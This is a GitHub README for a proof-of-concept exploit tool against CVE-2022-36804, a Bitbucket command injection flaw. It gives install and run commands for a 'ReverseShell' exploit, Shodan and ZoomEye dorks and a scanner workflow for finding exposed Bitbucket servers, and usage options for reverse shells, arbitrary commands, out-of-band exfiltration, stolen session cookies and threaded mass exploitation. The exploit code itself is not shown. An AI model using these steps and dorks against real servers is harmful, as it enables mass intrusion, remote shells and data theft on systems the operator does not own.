# Original Project

[https://github.com/BenHays142/CVE-2022-36804-PoC-Exploit](https://github.com/BenHays142/CVE-2022-36804-PoC-Exploit)

# CVE-2022-36804-PoC-Exploit
A somewhat reliable PoC exploit for CVE-2022-36804 (BitBucket Critical Command Injection). This attack generally requires public repos to be enabled, however session cookies are also compatible with this exploit. Note: this exploit includes automatic repo detection which is handy if you don't want to manually find open repos yourself.


## How To Install
```bash
git clone https://github.com/trhacknon/CVE-2022-36804-ReverseShell.git;
cd CVE-2022-36804-ReverseShell
python3 -m pip install -r requirements.txt
python3 main.py --server [target]
```
## dork
```
inurl:"/repos?visibility=public"
http.favicon.hash:667017222 http.title:Public
```
Scanner

1. Change the API key in shodan-query.py
2. Run shodan-query.py to grab results (You can change the query in the file)
3. Run check.py to check if BitBucket Instances are vulnerable to Critical Command Injection


## How To Use
```
usage: main.py [-h] [--server SERVER] [--project PROJECT] [--repo REPO] [--skip-auto]
               [--session SESSION] [--command CMD] [--file FILE] [--output OUTPUT]
               [--lhost LHOST] [--lport LPORT] [--threads THREADS]

Exploit BitBucket Instances (< v8.3.1) using CVE-2022-36804. Exploits automagically
without any extra parameters, but allows for custom settings as well.

options:
  -h, --help         show this help message and exit
  --server SERVER    Host to attack
  --project PROJECT  The name of the project the repository resides in
  --repo REPO        The name of the repository
  --skip-auto        Skip the automatic finding of exploitable repos
  --session SESSION  Value of 'BITBUCKETSESSIONID' cookie, useful if target repo is
                     private
  --command CMD      Command to execute if exploit is successful (Note: getting output
                     isn't reliable so OOB exfil is a must)
  --file FILE        File to scan bulk hosts
  --output OUTPUT    Output file for the session
  --lhost LHOST      Your Local Host for reverse shell
  --lport LPORT      Your Local Port for reverse shell
  --threads THREADS  Threads for mass exploitation
```

##Zoomeye Dorks
```
app:"Bitbucket" +banner:"repos?visibility=public"

app:"Bitbucket" +title:"public"

app:"Bitbucket"

iconhash:667017222
```

## References
[Atlassian Advisory](https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html)

[Atlassian Jira Issue](https://jira.atlassian.com/browse/BSERV-13438)

[NIST CVE](https://nvd.nist.gov/vuln/detail/CVE-2022-36804)
